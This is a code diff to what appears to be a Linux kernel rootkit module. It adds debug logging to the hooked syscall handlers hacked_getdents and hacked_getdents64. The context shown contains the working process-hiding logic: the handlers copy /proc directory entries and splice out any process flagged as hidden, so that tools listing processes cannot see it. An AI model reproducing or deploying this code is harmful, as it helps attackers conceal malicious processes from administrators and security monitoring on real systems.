@@ -60,20 +60,24 @@ asmlinkage long hacked_getdents(const struct pt_regs* p_regs)
 	struct inode* p_inode;
 
     if (ret < 1) {
+        KLOG_DEBUG(LOG_PREFIX "systbl::hacked_getdents: end of directory or error (%d)", ret);
 		return ret;
 	}
 
 	p_inode = current->files->fdt->fd[/*fd*/(int)p_regs->di]->f_path.dentry->d_inode;
 	if ((p_inode->i_ino != PROC_ROOT_INO) || MAJOR(p_inode->i_rdev)) {
+	    KLOG_DEBUG(LOG_PREFIX "systbl::hacked_getdents: directory is not in proc_fs");
 		return ret;
 	}
 
 	p_kdirent = kzalloc(ret, GFP_KERNEL);
 	if (p_kdirent == NULL) {
+	    KLOG_DEBUG(LOG_PREFIX "systbl::hacked_getdents: failed to alloc memory");
 		return ret;
 	}
 
 	if (copy_from_user(p_kdirent, p_dirent, ret) != 0) {
+	    KLOG_DEBUG(LOG_PREFIX "systbl::hacked_getdents: failed to copy data from user");
 		kfree(p_kdirent);
 		return ret;
 	}
@@ -81,8 +85,10 @@ asmlinkage long hacked_getdents(const struct pt_regs* p_regs)
 	while (off < ret) {
 		p_dir = (void*)p_kdirent + off;
 		if (is_process_hidden(simple_strtoul(p_dir->d_name, NULL, 10))) {
+		    KLOG_DEBUG(LOG_PREFIX "systbl::hacked_getdents: process '%s' is hidden", p_dir->d_name);
 			if (p_dir == p_kdirent) {
 				ret -= p_dir->d_reclen;
+		        KLOG_DEBUG(LOG_PREFIX "systbl::hacked_getdents: skip directory '%s' (%d)", p_dir->d_name, ret);
 				memmove(p_dir, (void *)p_dir + p_dir->d_reclen, ret);
 			} else {
 			    p_prev->d_reclen += p_dir->d_reclen;
@@ -97,6 +103,7 @@ asmlinkage long hacked_getdents(const struct pt_regs* p_regs)
 		return ret;
 	}
 	kfree(p_kdirent);
+	KLOG_DEBUG(LOG_PREFIX "systbl::hacked_getdents: result %d", ret);
 	return ret;
 }
 
@@ -112,20 +119,24 @@ asmlinkage long hacked_getdents64(const struct pt_regs* p_regs)
 	struct inode* p_inode;
 
     if (ret < 1) {
+        KLOG_DEBUG(LOG_PREFIX "systbl::hacked_getdents64: end of directory or error (%d)", ret);
 		return ret;
 	}
 
 	p_inode = current->files->fdt->fd[/*fd*/(int)p_regs->di]->f_path.dentry->d_inode;
 	if ((p_inode->i_ino != PROC_ROOT_INO) || MAJOR(p_inode->i_rdev)) {
+	    KLOG_DEBUG(LOG_PREFIX "systbl::hacked_getdents64: directory is not in proc_fs");
 		return ret;
 	}
 
 	p_kdirent = kzalloc(ret, GFP_KERNEL);
 	if (p_kdirent == NULL) {
+	    KLOG_DEBUG(LOG_PREFIX "systbl::hacked_getdents64: failed to alloc memory");
 		return ret;
 	}
 
 	if (copy_from_user(p_kdirent, p_dirent, ret) != 0) {
+	    KLOG_DEBUG(LOG_PREFIX "systbl::hacked_getdents64: failed to copy data from user");
 		kfree(p_kdirent);
 		return ret;
 	}
@@ -134,9 +145,11 @@ asmlinkage long hacked_getdents64(const struct pt_regs* p_regs)
 		p_dir = (void*)p_kdirent + off;
 		//p_dir = (void*)p_dirent + off;
 		if (is_process_hidden(simple_strtoul(p_dir->d_name, NULL, 10))) {
+		    KLOG_DEBUG(LOG_PREFIX "systbl::hacked_getdents64: process '%s' is hidden", p_dir->d_name);
 			if (p_dir == p_kdirent) {
 			//if (p_dir == p_dirent) {
 				ret -= p_dir->d_reclen;
+		        KLOG_DEBUG(LOG_PREFIX "systbl::hacked_getdents64: skip directory '%s' (%d)", p_dir->d_name, ret);
 				memmove(p_dir, (void *)p_dir + p_dir->d_reclen, ret);
 			} else {
 			    p_prev->d_reclen += p_dir->d_reclen;
@@ -151,6 +164,7 @@ asmlinkage long hacked_getdents64(const struct pt_regs* p_regs)
 		return ret;
 	}
 	kfree(p_kdirent);
+	KLOG_DEBUG(LOG_PREFIX "systbl::hacked_getdents64: result %d", ret);
 	return ret;
 }
 
